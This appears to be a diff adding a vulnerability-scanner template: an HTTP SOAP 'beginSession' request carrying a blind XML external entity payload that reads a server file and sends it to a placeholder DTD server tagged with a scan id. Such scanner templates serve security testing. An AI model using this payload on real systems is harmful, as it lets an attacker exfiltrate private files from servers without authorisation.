@@ -1,0 +1,10 @@
+Content-Type: test/xml; charset=utf-8
+SOAPAction: beginSession
+
+<!DOCTYPE roottag [
+<!ENTITY % exfiltrate_data SYSTEM "file://$exfiltrate_filename">
+<!ENTITY % dtd SYSTEM "http://$dtd_server:$dtd_port/?scan_id=$scan_id">
+%dtd;
+%send;
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body xmlns:ns0="http://www.compositesw.com/services/system/util/session"><ns0:beginSession><ns0:sessionTimeout>&myall;</ns0:sessionTimeout></ns0:beginSession></soap:Body></soap:Envelope>
